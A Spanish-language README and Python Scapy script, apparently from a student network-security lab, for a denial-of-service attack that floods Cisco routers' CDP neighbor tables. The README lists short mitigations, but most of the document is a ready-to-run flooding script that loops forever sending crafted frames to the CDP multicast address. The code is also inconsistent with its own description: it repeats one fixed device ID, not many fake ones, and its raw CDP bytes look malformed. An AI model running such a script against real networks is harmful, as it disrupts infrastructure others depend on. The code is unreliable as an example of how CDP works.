# DoS-s-Atack
CDP Neighbor Table Flooding (DoS) 
-----
/
/
https://youtu.be/uBO5Hv6cM5o
/
/

1. Objetivo del Script 
El objetivo de esta herramienta es realizar una denegación de servicio (DoS) contra la tabla 
de memoria de protocolos de capa 2 en dispositivos Cisco. Mediante la inyección masiva 
de paquetes CDP (Cisco Discovery Protocol) con identificadores falsos, se busca saturar la 
memoria del router (RAM) y ocultar a los vecinos legítimos de la red. 
2. Documentación Técnica de la Topología 
• Router Objetivo (GW_20231243): IP 10.23.12.1 configurado con CDP activo. 
• Atacante (Kali Linux): IP 10.23.12.43. 
• Interfaces: Kali (eth0) conectado a Router (E0/0) mediante un Ethernet Switch. 
• Direccionamiento: Basado en la matrícula 2023-1243 (Red 10.23.12.0/24). 
3. Parámetros del Script y Requisitos 
• Librería: Scapy 2.6.1. 
• Parámetros: * dst="01:00:0c:cc:cc:cc" (Dirección Multicast CDP). 
o device_id="MAT_20231243" (Carga útil personalizada). 
o inter=0.1 (Intervalo de envío). 
• Requisito Especial: Dado que cdp no está definido de forma nativa en este 
entorno, se utilizó load_contrib('cdp') y el envío mediante capas Raw y SNAP para 
garantizar la compatibilidad con el Switch. 
4. Medidas de Mitigación 
• Deshabilitar CDP globalmente con el comando no cdp run. 
• Deshabilitar el protocolo en interfaces que dan hacia áreas no confiables con no 
cdp enable.

README.md
-----

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import *

# NOTA TÉCNICA: En este entorno Scapy v2.6, el protocolo 'cdp' no está 
# definido de forma nativa. Se requiere la carga manual de la contribución.
load_contrib("cdp")

def cdp_flood():
    print("Iniciando ataque DoS a la tabla de vecinos CDP...")
    print("Objetivo: Inundar el Router con la matrícula MAT_20231243")
    
    # Construcción del paquete usando capas Raw y SNAP para máxima 
    # compatibilidad con switches y routers Cisco.
    # Dirección Multicast de Cisco: 01:00:0c:cc:cc:cc
    pkt = (
        Ether(dst="01:00:0c:cc:cc:cc") /
        SNAP() /
        Raw(load=b"\x02\x01\x00\x0c\x01\x01\x00\x11MAT_20231243")
    )

    # Envío en bucle infinito con intervalo de 0.1 segundos
    sendp(pkt, loop=1, inter=0.1)

if __name__ == "__main__":
    cdp_flood()
